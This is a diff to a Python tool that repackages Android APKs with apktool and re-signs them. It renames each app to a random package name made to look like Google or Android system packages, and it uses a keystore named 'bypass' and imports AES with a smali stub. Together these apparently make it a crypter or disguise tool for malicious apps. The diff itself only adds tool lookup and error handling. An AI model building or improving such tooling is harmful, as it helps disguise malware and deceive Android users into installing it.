@@ -1,18 +1,24 @@
-import os, uuid, shutil, subprocess, zipfile, random, string, re
+import os, uuid, shutil, subprocess, zipfile, random, string, re, glob
 from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
-STUB = Path(__file__).parent / "stub_smali"
+STUB     = Path(__file__).parent / "stub_smali"
 PREBUILT = Path(__file__).parent / "prebuilt"
 KEYSTORE = Path("/tmp/bypass.jks")
-APKSIGNER = "/opt/android-sdk/build-tools/34.0.0/apksigner"
 
 _PKG_PREFIXES = [
     "com.android.system","com.google.android.gms",
     "com.android.settings","com.android.vending",
     "com.google.android","com.android.providers",
 ]
+
+def find_tool(name):
+    t = shutil.which(name)
+    if t: return t
+    for p in glob.glob(f"/opt/android-sdk/build-tools/*/{name}"):
+        return p
+    raise FileNotFoundError(f"{name} nao encontrado no sistema")
 
 def random_package():
     return f"{random.choice(_PKG_PREFIXES)}.{''.join(random.choices(string.ascii_lowercase,k=6))}"
@@ -45,7 +51,8 @@ def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playsto
                        check=True, capture_output=True)
 
         manifest = os.path.join(decoded,"AndroidManifest.xml")
-        m = re.search(r'package="([^"]+)"', open(manifest, encoding="utf-8", errors="replace").read())
+        raw = open(manifest, encoding="utf-8", errors="replace").read()
+        m = re.search(r'package="([^"]+)"', raw)
         orig_pkg = m.group(1) if m else "com.original.app"
         new_pkg  = random_package()
 
@@ -89,14 +96,20 @@ def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playsto
 
         subprocess.run(["apktool","b",decoded,"-o",unsigned,"--force-all"],
                        check=True, capture_output=True)
-        subprocess.run(["zipalign","-f","4",unsigned,aligned],
+
+        zipalign = find_tool("zipalign")
+        subprocess.run([zipalign,"-f","4",unsigned,aligned],
                        check=True, capture_output=True)
 
         ensure_keystore()
-        subprocess.run([APKSIGNER, "sign",
+        apksigner = find_tool("apksigner")
+        r = subprocess.run([apksigner,"sign",
             "--ks",str(KEYSTORE),"--ks-pass","pass:bypass123",
             "--key-pass","pass:bypass123","--ks-key-alias","bypass",
             "--out",output_apk, aligned],
-            check=True, capture_output=True)
+            capture_output=True)
+        if r.returncode != 0:
+            raise RuntimeError(f"apksigner falhou: {r.stderr.decode(errors='replace')}")
+
     finally:
         shutil.rmtree(str(job), ignore_errors=True)
